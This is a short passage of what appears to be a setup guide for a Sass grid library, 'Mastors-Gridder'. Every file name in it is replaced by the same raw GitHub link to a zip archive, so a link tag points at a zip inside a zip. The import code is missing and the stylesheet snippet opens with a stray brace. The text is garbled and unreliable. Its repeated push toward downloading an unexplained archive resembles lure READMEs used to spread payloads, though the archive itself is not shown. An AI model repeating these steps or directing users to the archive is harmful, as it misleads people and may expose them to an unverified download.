3. Link your `https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Gridder_Mastors_v1.7.zip` file in the `<head>` section of your `https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Gridder_Mastors_v1.7.zip` using a `<link>` tag.

### Step 2: Import Mastors-Gridder

In your `https://github.com/haidarjakiem/Mastors-Gridder/raw/refs/heads/main/assets/Gridder_Mastors_v1.7.zip`, import Mastors-Gridder using:

### Step 3: Use the Layouts

}

.column {
  @include column(6); // This creates two equal-width columns
}
